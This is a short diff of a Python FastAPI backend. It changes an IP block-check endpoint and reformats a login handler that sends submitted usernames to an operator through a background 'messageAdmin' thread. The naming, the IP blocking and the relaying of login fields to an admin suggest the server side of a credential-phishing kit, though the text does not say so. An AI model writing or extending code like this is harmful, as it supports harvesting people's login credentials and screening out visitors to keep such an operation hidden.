@@ -131,13 +131,13 @@ async def create_lovelyclient(
     return id
 
 
-@app.get("/ipblockcheck")
+@app.get("/ipblockcheck/{ip}")
 def ipBlockCheck(
+    ip: str,
     request: Request,
     db: Session = Depends(get_db),
-    ip_xforwarded: str = Header(None, alias="X-Forwarded-For"),
 ):
-    if crud.check_IfIPBlocked(db, ip_xforwarded):
+    if crud.check_IfIPBlocked(db, ip):
         return {"stats": "blocked"}
     return {"stats": "not"}
 
@@ -155,12 +155,16 @@ def login(
     item: schemas.Login,
     db: Session = Depends(get_db),
 ):
-    
-    # if only user was sent 
-    if item.password == "NONE" :
-        admin_message = f"----\n Username: \n id: {id}\n username:{item.username} \n----"
+
+    # if only user was sent
+    if item.password == "NONE":
+        admin_message = (
+            f"----\n Username: \n id: {id}\n username:{item.username} \n----"
+        )
         # messageAdmin(admin_message)
-        messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
+        messageadmin_thread = threading.Thread(
+            target=messageAdmin, args=(admin_message,)
+        )
         messageadmin_thread.start()
         return
 
